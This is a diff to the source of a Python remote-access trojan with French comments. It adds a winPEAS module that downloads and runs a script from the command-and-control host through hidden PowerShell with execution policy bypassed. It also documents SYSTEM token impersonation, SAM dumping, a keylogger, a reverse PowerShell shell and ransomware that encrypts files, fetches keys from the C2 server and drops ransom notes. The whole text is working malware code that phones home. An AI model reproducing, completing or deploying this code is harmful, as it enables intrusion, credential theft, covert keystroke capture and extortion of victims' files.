@@ -35,8 +35,7 @@ receive = ''
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Adresse IP du serveur C2 (Command & Control)
-myip = "LHOST_IP" # Change it
-
+myip = "0.0.0.0" #Change IP
 
 # ============================================
 # CHEMINS ET PERSISTENCE
@@ -56,7 +55,6 @@ current_script_path = os.path.abspath(__file__)
 while True:
     try:
         s.connect((myip, 4444))
-        #s.connect(('myip', 4444))
         break
     except Exception as e:
         print(f"[-] Echec de connexion\n[+] Nouvelle tentative")
@@ -172,6 +170,7 @@ help_menu = '''
                         - rubeus
                         - lazagne
                         - kekeo
+                        - winpeas
                         - amsi
                         - etw
                     Loading External Modules:
@@ -414,6 +413,7 @@ def Load_Module(module_name):
         Load_Module("rubeus")
         Load_Module("lazagne")
         Load_Module("kekeo")
+        Load_Module("winpeas")
         Load_Module("amsi")
         Load_Module("etw")
         s.send(chariot + b"[LOADMODULE] All modules loaded.\n" + chariot)
@@ -487,6 +487,18 @@ def Load_Module(module_name):
         results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
         output = results.stdout.read() + results.stderr.read()
         s.send(chariot + b"[LOADMODULE] Kekeo module loaded.\n" + chariot)
+    elif module_name == "winpeas":
+        global winpeastodelete, winpeastoexecute
+        winpeastodelete = current_path + "\\winPEAS.ps1"
+        winpeastoexecute = current_path + "\\winPEAS.ps1"
+        payload = f"""
+        $url = "http://{myip}/download/winPEAS.ps1"
+        $destination = "$(get-location)/winPEAS.ps1"
+        Invoke-WebRequest -Uri $url -OutFile $destination
+        """
+        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)  
+        output = results.stdout.read() + results.stderr.read()
+        s.send(chariot + b"[LOADMODULE] winPEAS module loaded.\n" + chariot)
     elif module_name == "amsi":
         global amsitodelete, amsitoexecute
         amsitodelete = current_path + "\\amsibypass.ps1"
@@ -539,6 +551,9 @@ def Remove_Module(module_name):
     elif module_name == "kekeo":
         shutil.rmtree(kekeotodelete, ignore_errors=True)
         s.send(chariot + b"[REMOVEMODULE] Kekeo module removed.\n" + chariot)
+    elif module_name == "winpeas":
+        os.remove(winpeastodelete)
+        s.send(chariot + b"[REMOVEMODULE] winPEAS module removed.\n" + chariot)
     elif module_name == "amsi":
         os.remove(amsitodelete)
         s.send(chariot + b"[REMOVEMODULE] AMSI Bypass module removed.\n" + chariot)
@@ -745,6 +760,36 @@ def Run_Module(module_name):
                 pass
 
         s.send(b"\n[KEKEO] Session interactive terminee. Retour au shell.\n" + chariot)
+    elif module_name == "winpeas":
+        s.send(chariot + b"[WINPEAS] Running winPEAS to enumerate possible privilege escalations...\n")
+        s.send(b"[WINPEAS] This may take several minutes - streaming output in real-time...\n" + chariot)
+        if winpeastoexecute is not None:
+            payload = f"""$path = "{winpeastoexecute}";& $path"""
+            proc = subprocess.Popen(
+                ["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], 
+                stdout=subprocess.PIPE, 
+                stdin=subprocess.PIPE, 
+                stderr=subprocess.STDOUT,  # Fusionner stderr dans stdout pour tout capturer
+                creationflags=CREATE_NO_WINDOW,
+                bufsize=1,  # Line buffered
+                universal_newlines=False
+            )
+            
+            # Lecture et envoi en temps réel
+            while True:
+                chunk = proc.stdout.read(4096)  # Lire par chunks de 4KB
+                if not chunk and proc.poll() is not None:
+                    break
+                if chunk:
+                    try:
+                        s.send(chunk)
+                    except Exception:
+                        break
+            
+            proc.wait()  # Attendre la fin propre du processus
+        else:
+            s.send(b"[WINPEAS] winPEAS.ps1 not found. Load the module first.\n")
+        s.send(chariot + b"[WINPEAS] winPEAS execution done.\n" + chariot)
     elif module_name == "amsi":
         s.send(chariot + b"[AMSIBYPASS] Running AMSI Bypass in current PowerShell session...\n")
         if amsitoexecute is not None:
@@ -1067,7 +1112,11 @@ def Sam_Dump():
     except Exception as e:
         s.send(f"[SAMDUMP] Error: {e}\n".encode('utf-8') + chariot)
 
+# ============================================
+# FONCTIONS - PRIVILEGE ESCALATION
+# ============================================
 
+# Active tous les privilèges disponibles dans le token actuel (SeDebug, SeBackup, etc.)
 def Enable_All_Privileges():
     s.send(chariot + b"[GETPRIVS] Attempting to enable all privileges...\n")
     try:
@@ -1117,6 +1166,8 @@ def Enable_All_Privileges():
     except Exception as e:
         s.send(chariot + f"[GETPRIVS] Error: {e}\n".encode('utf-8') + chariot)
 
+# Élève les privilèges à SYSTEM en dupliquant le token d'un processus SYSTEM (winlogon, lsass, services...)
+# Le token est stocké globalement et réappliqué automatiquement aux threads qui en ont besoin
 def Get_System():
     s.send(chariot + b"[GETSYSTEM] Attempting privilege escalation to SYSTEM...\n")
     
@@ -1252,6 +1303,7 @@ def Get_System():
     except Exception as e:
         s.send(chariot + f"[GETSYSTEM] Error: {e}\n".encode('utf-8') + chariot)
 
+# Affiche l'utilisateur actuel, le SID et vérifie si on est SYSTEM (lit le token du thread)
 def Whoami():
     s.send(chariot + b"[WHOAMI] Retrieving current user information...\n")
 
@@ -1302,6 +1354,7 @@ def Whoami():
     except Exception as e:
         s.send(f"[WHOAMI] Error: {e}\n".encode('utf-8'))
 
+# Réapplique l'impersonation SYSTEM au thread actuel (appelé automatiquement par lsadump, samdump, etc.)
 def Ensure_System_Privileges():
     """
     Réapplique l'impersonation SYSTEM au thread actuel.
@@ -1321,18 +1374,24 @@ def Ensure_System_Privileges():
     except Exception:
         return False
             
+# ============================================
+# FONCTIONS - KEYLOGGER
+# ============================================
 
+# Démarre le keylogger dans un thread séparé et envoie les frappes capturées au serveur C2
 def StartKeyLogger():
     s.send(chariot + b"[KEYLOGGER] Starting Keylogger...")
     keylogger_thread = threading.Thread(target=KeyLogger, name="KeyloggerThread", daemon=True)
     keylogger_thread.start()
 
+# Thread du keylogger qui capture les frappes clavier et les enregistre dans un fichier caché
 def KeyLogger():
     s.send(b"[KEYLOGGER] Keylogger is running." + chariot + chariot)
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         while not stop_event.is_set():
             listener.join(0.1)
 
+# Arrête le thread du keylogger et nettoie les ressources
 def StopKeyLogger():
     s.send(chariot + b"[KEYLOGGER] Stopping Keylogger..." + chariot + chariot)
     stop_event.set()
@@ -1341,6 +1400,7 @@ def StopKeyLogger():
             thread.join()
             print("[KEYLOGGER] Keylogger stopped.")
 
+# Callback à chaque touche pressée - capture les frappes, gère les CTRL+, SHIFT+ et les enregistre
 def on_press(key):
     pressed_keys.add(key)
     if not os.path.exists(AppData_Path_Keylog):
@@ -1377,10 +1437,12 @@ def on_press(key):
             else:
                 logkey.write(f'[KEY: {key}]')
 
+# Callback à chaque touche relâchée - retire la touche du set des touches pressées
 def on_release(key):
     if key in pressed_keys:
         pressed_keys.remove(key)
 
+# Supprime le dernier caractère du fichier de log (gestion du backspace)
 def RemoveLastChar(AppData_Path_Keylog_File):
     with open(AppData_Path_Keylog_File, "r+") as f:
         f.seek(0, os.SEEK_END)
@@ -1389,6 +1451,11 @@ def RemoveLastChar(AppData_Path_Keylog_File):
             f.seek(pos - 1)
             f.truncate()
 
+# ============================================
+# FONCTIONS - POWERSHELL TERMINAL
+# ============================================
+
+# Ouvre un terminal PowerShell interactif permettant d'exécuter des commandes distantes avec persistance du contexte
 def Open_PowerShell():
     s.send(chariot + b"[POWERSHELL] Opening PowerShell terminal..." + chariot + chariot)
 
@@ -1430,8 +1497,6 @@ def Open_PowerShell():
 
     t_out = threading.Thread(target=pump_stdout, daemon=True)
     t_out.start()
-
-    
 
     try:
         while True:
@@ -1653,6 +1718,11 @@ def Open_PowerShell():
 
     s.send(b"\n[POWERSHELL] Session interactive terminee.\n" + chariot)
 
+# ============================================
+# FONCTIONS - RANSOMWARE
+# ============================================
+
+# Génère une clé de chiffrement Fernet via le serveur C2 et retourne le handle + l'ID
 def KeyGen():
     keygenurl = f"http://{myip}/ransomware/ransomware.php"
     id = random.randint(100000, 999999)
@@ -1662,20 +1732,24 @@ def KeyGen():
     h_fernet = Fernet(k)
     return h_fernet, id
 
+# Chiffre tous les fichiers d'un répertoire avec Fernet et remplace leur contenu par la version chiffrée
 def Encrypt(path, h_fernet):
     for root, dirs, files in os.walk(path):
         for file in files:
             file_path = os.path.join(root, file)
-            try:
-                with open(file_path, 'rb') as f:
-                    data = f.read()
-                encrypted_data = h_fernet.encrypt(data)
-                with open(file_path, 'wb') as f:
-                    f.write(encrypted_data)
-                os.rename(file_path, file_path + '.getcrypted')
-            except PermissionError:
-                pass
+            s.send(f"[RANSOMWARE] Encrypting file: {file_path}\n".encode('utf-8'))
+            if not file.endswith('.cry') and file != 'id.txt' and file != 'RANSOM_NOTE.txt':
+                try:
+                    with open(file_path, 'rb') as f:
+                        data = f.read()
+                    encrypted_data = h_fernet.encrypt(data)
+                    with open(file_path, 'wb') as f:
+                        f.write(encrypted_data)
+                    os.rename(file_path, file_path + '.cry')
+                except PermissionError:
+                    pass
 
+# Stocke l'ID de la victime dans un fichier id.txt pour identification lors du déchiffrement
 def Store_Id(path, id):  
     # Store ID in separate file
     with open(os.path.join(path, 'id.txt'), 'w') as f:
@@ -1685,6 +1759,7 @@ def Store_Id(path, id):
     #with open(os.path.join(path, 'key.txt'), 'wb') as f:
     #    f.write(key)
 
+# Affiche la note de ransom dans chaque sous-répertoire avec les instructions pour la victime
 def Display_Ransom_Note(path):
     ransom_note = f"""
     Your files have been encrypted!
@@ -1701,6 +1776,7 @@ def Display_Ransom_Note(path):
         with open(os.path.join(root, 'RANSOM_NOTE.txt'), 'w') as f:
             f.write(ransom_note)
 
+# Démarre le processus de ransomware: génère clé, chiffre fichiers, crée note de ransom
 def Start_Ransomware(path_to_files):
     s.send(chariot + b"[RANSOMWARE] Starting ransomware encryption...\n")
     h_fernet, id = KeyGen()
@@ -1709,6 +1785,7 @@ def Start_Ransomware(path_to_files):
     Display_Ransom_Note(path_to_files)
     s.send(b"[RANSOMWARE] Encryption complete. Ransom note created.\n" + chariot)
 
+# Récupère l'ID de la victime et la clé de déchiffrement depuis le serveur C2
 def Get_Id(path):
     with open(os.path.join(path, 'id.txt'), 'r') as f:
         id = f.read()
@@ -1720,11 +1797,13 @@ def Get_Id(path):
     
     return h_fernet, id
 
+# Déchiffre tous les fichiers d'un répertoire de manière récursive avec la clé Fernet
 def Decrypt(path, h_fernet):
     for root, dirs, files in os.walk(path):
         for file in files:
-            if file.endswith('.getcrypted'):
+            if file.endswith('.cry'):
                 file_path = os.path.join(root, file)
+                s.send(f"[RANSOMWARE] Decrypting file: {file_path}\n".encode('utf-8'))
                 with open(file_path, 'rb') as f:
                     encrypted_data = f.read()
                 basename, extension = os.path.splitext(file_path)
@@ -1733,23 +1812,27 @@ def Decrypt(path, h_fernet):
                     f.write(decrypted_data)
                 os.remove(file_path)
 
+# Supprime toutes les notes de ransom après déchiffrement
 def Delete_Ransom_Note(path):
     for root, dirs, files in os.walk(path):
         ransom_note_path = os.path.join(root, 'RANSOM_NOTE.txt')
         if os.path.exists(ransom_note_path):
             os.remove(ransom_note_path)
 
+# Supprime le fichier id.txt après déchiffrement
 def Delete_Key_Id_Files(path):
     id_path = os.path.join(path, 'id.txt')
     if os.path.exists(id_path):
         os.remove(id_path)
 
+# Supprime l'ID et la clé du serveur C2 après déchiffrement réussi
 def Delete_In_Server(id):
     deleteurl = f"http://{myip}/ransomware/deleteid.php"
     params = {"deleteid": id}
     req = requests.get(deleteurl, params=params)
 
 
+# Arrête le ransomware: récupère clé, déchiffre fichiers, nettoie traces
 def Stop_Ransomware(path_to_files):
     s.send(chariot + b"[RANSOMWARE] Starting ransomware decryption...\n")
     h_fernet, id = Get_Id(path_to_files)
@@ -1760,7 +1843,11 @@ def Stop_Ransomware(path_to_files):
     s.send(b"[RANSOMWARE] Decryption complete. Ransom note removed.\n" + chariot)
 
 
+# ============================================
+# BOUCLE PRINCIPALE - COMMAND HANDLER
+# ============================================
 
+# Boucle principale qui reçoit les commandes du serveur C2 et les traite
 while True:
     cwd = os.getcwd()
     s.send(f'[NATIVE] {cwd} - $ '.encode())
